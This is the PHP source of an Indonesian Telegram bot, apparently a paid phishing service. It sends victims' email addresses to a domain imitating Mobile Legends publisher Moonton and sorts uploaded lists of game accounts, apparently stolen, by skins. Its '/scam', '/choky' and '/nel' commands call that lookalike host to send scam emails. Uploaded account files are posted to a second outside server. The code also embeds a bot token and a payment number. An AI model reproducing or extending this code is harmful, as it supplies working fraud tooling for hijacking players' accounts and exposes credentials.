<?php
// DEBUG & LOG
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
file_put_contents("log.txt", file_get_contents("php://input") . PHP_EOL, FILE_APPEND);

// KONFIGURASI
$token = "8141030556:AAEgNJzBdkr0Kfx9niBcTwtKltnknHUNj08";
$adminId = 7268861803;

// DATA
$data = json_decode(file_get_contents("php://input"), true);
$chatId = $data['message']['chat']['id'] ?? null;
$text = $data['message']['text'] ?? null;
$senderId = $data['message']['from']['id'] ?? null;
$hasFile = isset($data['message']['document']);
$fileName = $hasFile ? $data['message']['document']['file_name'] : null;
$fileId = $hasFile ? $data['message']['document']['file_id'] : null;

// FILE DATA
$subscribersFile = __DIR__ . "/data/subscribers.json";
$lastScamFile = __DIR__ . "/data/last_scam.json";
if (!file_exists($subscribersFile)) file_put_contents($subscribersFile, "[]");
if (!file_exists($lastScamFile)) file_put_contents($lastScamFile, "{}");

$subscribers = json_decode(file_get_contents($subscribersFile), true);
$lastScam = json_decode(file_get_contents($lastScamFile), true);

// FUNCTIONS
function sendMessage($chatId, $text) {
    global $token;
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
        'chat_id' => $chatId,
        'text' => $text,
        'parse_mode' => 'Markdown'
    ]));
}

function isActive($id, $subs) {
    foreach ($subs as $s) {
        if ($s['id'] == $id && !empty($s['expires'])) {
            $expires = strtotime($s['expires']);
            return $expires !== false && $expires > time();
        }
    }
    return false;
}

// ========== COMMANDS ==========

// /start
if ($text == "/start") {
    $found = false;
    foreach ($subscribers as $s) {
        if ($s['id'] == $senderId) {
            $found = true;
            break;
        }
    }
    if (!$found) {
        $subscribers[] = ['id' => $senderId, 'expires' => null];
        file_put_contents($subscribersFile, json_encode($subscribers, JSON_PRETTY_PRINT));
    }

    $msg = "👋 *Selamat datang di Bot MLBB Email Tool!*

Perintah yang tersedia:
• `/langganan` — Panduan & pembayaran.
• `/status` — Cek status langganan kamu.
• `/scam email@example.com usertelegram` — Kirim email (setelah aktif).
• `/sortdata` — Kirim file akun MLBB (.txt), bot akan sortir berdasarkan skin yang ditemukan (gratis, tanpa langganan).

⚠️ Lakukan pembayaran sesuai panduan agar akun kamu diaktifkan.";
    sendMessage($chatId, $msg);
    exit;
}

// /langganan
if ($text == "/langganan") {
    $msg = "📄 *Panduan Berlangganan Bot MLBB Email Tool*

💰 *Harga Langganan:*
• 7 Hari  = Rp100.000
• 15 Hari = Rp180.000
• 30 Hari = Rp280.000

💳 *Pembayaran:*
• GoPay / OVO: *083133199990*

📌 *Langkah:*
1️⃣ Transfer sesuai harga.
2️⃣ Kirim bukti pembayaran (foto) langsung ke bot.
3️⃣ Tunggu konfirmasi dari admin.
4️⃣ Setelah aktif, gunakan `/scam`.

Contoh:
`/scam email@example.com usertelegram`";
    sendMessage($chatId, $msg);
    exit;
}

// /status
if ($text == "/status") {
    foreach ($subscribers as $s) {
        if ($s['id'] == $senderId) {
            if (!empty($s['expires'])) {
                $expired = strtotime($s['expires']);
                if ($expired > time()) {
                    $sisa = ceil(($expired - time()) / 86400);
                    sendMessage($chatId, "✅ Status Aktif\n⏳ Sisa: $sisa hari\n📅 Expired: ".$s['expires']);
                    exit;
                }
            }
            break;
        }
    }
    sendMessage($chatId, "❌ Status Tidak Aktif.\nSilakan lakukan pembayaran.");
    exit;
}

// /activate
if (strpos($text, "/activate") === 0) {
    if ($senderId != $adminId) {
        sendMessage($chatId, "❌ Perintah ini hanya untuk admin.");
        exit;
    }

    $parts = explode(" ", $text);
    if (count($parts) != 3) {
        sendMessage($chatId, "Format:\n/activate user_id jumlah_hari");
        exit;
    }

    $targetId = intval($parts[1]);
    $days = intval($parts[2]);
    $found = false;
    $expiredDate = null;

    foreach ($subscribers as &$s) {
        if ($s['id'] == $targetId) {
            $found = true;
            $currentExpiry = strtotime($s['expires'] ?? '0');
            $newExpiry = $currentExpiry > time() ? $currentExpiry + ($days * 86400) : time() + ($days * 86400);
            $s['expires'] = date('Y-m-d', $newExpiry);
            $expiredDate = $s['expires'];
            break;
        }
    }

    if (!$found) {
        $expiredDate = date('Y-m-d', time() + ($days * 86400));
        $subscribers[] = ['id' => $targetId, 'expires' => $expiredDate];
    }

    file_put_contents($subscribersFile, json_encode($subscribers, JSON_PRETTY_PRINT));

    sendMessage($chatId, "✅ User `$targetId` diaktifkan/perpanjang hingga $expiredDate.");
    sendMessage($targetId, "🎉 Langganan kamu aktif sampai $expiredDate.");
    exit;
}

// /listall
if ($text == "/listall" && $senderId == $adminId) {
    $list = "*Daftar Semua Pengguna:*\n\n";
    foreach ($subscribers as $s) {
        $list .= $s['id']."\n";
    }
    sendMessage($chatId, $list ?: "Belum ada user.");
    exit;
}

// /listactive
if ($text == "/listactive" && $senderId == $adminId) {
    $list = "*Pengguna Aktif:*\n\n";
    foreach ($subscribers as $s) {
        if (!empty($s['expires']) && strtotime($s['expires']) > time()) {
            $list .= $s['id']." (hingga ".$s['expires'].")\n";
        }
    }
    sendMessage($chatId, $list ?: "Tidak ada pengguna aktif.");
    exit;
}

// /pesan
if (strpos($text, "/pesan") === 0 && $senderId == $adminId) {
    $parts = explode(" ", $text, 2);
    if (count($parts) < 2) {
        sendMessage($chatId, "Format:\n/pesan isi_pesan");
        exit;
    }
    $pesan = $parts[1];
    foreach ($subscribers as $s) {
        sendMessage($s['id'], "📢 Pesan Admin:\n\n$pesan");
    }
    sendMessage($chatId, "✅ Pesan terkirim ke semua pengguna.");
    exit;
}

// /scam
if (strpos($text, "/scam") === 0) {
    $now = time();
    $isAdmin = $senderId == $adminId;

    if (!isActive($senderId, $subscribers) && !$isAdmin) {
        sendMessage($chatId, "❌ Langganan tidak aktif.");
        exit;
    }

    if (!$isAdmin && isset($lastScam[$senderId]) && ($now - $lastScam[$senderId]) < 10) {
        $sisa = 5 - ($now - $lastScam[$senderId]);
        sendMessage($chatId, "⏳ Tunggu $sisa detik sebelum menggunakan perintah ini lagi.");
        exit;
    }
    $parts = explode(" ", $text);
    if (count($parts) != 3) {
        sendMessage($chatId, "Format:\n/scam email@example.com usertelegram");
        exit;
    }

    $targetEmail = $parts[1];
    $userTelegram = ltrim($parts[2], '@');

    $url = "https://support-montoon.com/sendbot.php?email=".urlencode($targetEmail)."&to=".urlencode($userTelegram);
    $response = @file_get_contents($url);

    sendMessage($chatId, $response === false ? "⚠️ Gagal menghubungi server email." : "🔔 $response");

    $lastScam[$senderId] = $now;
    file_put_contents($lastScamFile, json_encode($lastScam, JSON_PRETTY_PRINT));
    exit;
}

// /choky
if (strpos($text, "/choky") === 0) {
    if (!isActive($senderId, $subscribers) && $senderId != $adminId) {
        sendMessage($chatId, "❌ Langganan tidak aktif.");
        exit;
    }

    $cooldownKey = "cooldown_choky_" . $senderId;
    $cooldownTime = 120; // 2 menit

    if (isset($lastScam[$cooldownKey]) && (time() - $lastScam[$cooldownKey]) < $cooldownTime) {
        $remaining = $cooldownTime - (time() - $lastScam[$cooldownKey]);
        sendMessage($chatId, "⏳ Tunggu $remaining detik lagi sebelum pakai /choky.");
        exit;
    }

    $parts = explode(" ", $text);
    if (count($parts) != 2) {
        sendMessage($chatId, "Format:\n/choky email@example.com");
        exit;
    }

    $targetEmail = $parts[1];
    $url = "https://support-montoon.com/smtp.php?email=" . urlencode($targetEmail);
    $response = @file_get_contents($url);

    if ($response === false) {
        sendMessage($chatId, "❌ Gagal [$targetEmail]");
    } else {
        sendMessage($chatId, "✅ Berhasil [$targetEmail]");
        $lastScam[$cooldownKey] = time();
        file_put_contents($lastScamFile, json_encode($lastScam, JSON_PRETTY_PRINT));
    }
    exit;
}

// /nel
if (strpos($text, "/nel") === 0) {
    if (!isActive($senderId, $subscribers) && $senderId != $adminId) {
        sendMessage($chatId, "❌ Langganan tidak aktif.");
        exit;
    }

    $cooldownKey = "cooldown_nel_" . $senderId;
    $cooldownTime = 10; // 10 detik

    if (isset($lastScam[$cooldownKey]) && (time() - $lastScam[$cooldownKey]) < $cooldownTime) {
        $remaining = $cooldownTime - (time() - $lastScam[$cooldownKey]);
        sendMessage($chatId, "⏳ Tunggu $remaining detik lagi sebelum pakai /nel.");
        exit;
    }

    $parts = explode(" ", $text);
    if (count($parts) != 2) {
        sendMessage($chatId, "Format:\n/nel email@example.com");
        exit;
    }

    $targetEmail = $parts[1];
    $url = "https://support-montoon.com/nel.php?email=" . urlencode($targetEmail);
    $response = @file_get_contents($url);

    if ($response === false) {
        sendMessage($chatId, "❌ Gagal [$targetEmail]");
    } else {
        sendMessage($chatId, "✅ Berhasil [$targetEmail]");
        $lastScam[$cooldownKey] = time();
        file_put_contents($lastScamFile, json_encode($lastScam, JSON_PRETTY_PRINT));
    }
    exit;
}




// 📂 Sortir File TXT
if ($hasFile && strtolower(pathinfo($fileName, PATHINFO_EXTENSION)) === 'txt') {
    $getFile = json_decode(file_get_contents("https://api.telegram.org/bot$token/getFile?file_id=$fileId"), true);
    $filePath = $getFile['result']['file_path'] ?? null;

    if ($filePath) {
        $fileUrl = "https://api.telegram.org/file/bot$token/$filePath";
        $fileContent = file_get_contents($fileUrl);

        $sortedResult = @file_get_contents("https://teamcs.site/sorted.php", false, stream_context_create([
            'http' => [
                'method' => 'POST',
                'header' => "Content-Type: application/x-www-form-urlencoded",
                'content' => http_build_query(['data' => $fileContent])
            ]
        ]));

        sendMessage($chatId, $sortedResult ?: "⚠️ Gagal memproses file.");
    } else {
        sendMessage($chatId, "❌ Tidak dapat mengambil file.");
    }
    exit;
}

// 📤 Forward Foto
if (isset($data['message']['photo'])) {
    $photoArray = $data['message']['photo'];
    $fileId = end($photoArray)['file_id'];
    file_get_contents("https://api.telegram.org/bot$token/sendPhoto?" . http_build_query([
        'chat_id' => $adminId,
        'photo' => $fileId,
        'caption' => "📸 Foto dari user: `$senderId`",
        'parse_mode' => 'Markdown'
    ]));
    sendMessage($chatId, "📤 Bukti pembayaran kamu telah dikirim ke admin.");
    exit;
}

// DETEKSI EMAIL (khusus admin)
if (filter_var($text, FILTER_VALIDATE_EMAIL)) {
    if ($senderId != $adminId) exit;

    $url = "https://support-montoon.com/tes.php?email=" . urlencode($text);
    $response = @file_get_contents($url);

    sendMessage(
        $chatId,
        $response === false ? "⚠️ Gagal menghubungi server email." : "📧 $response"
    );
    exit;
}
?>
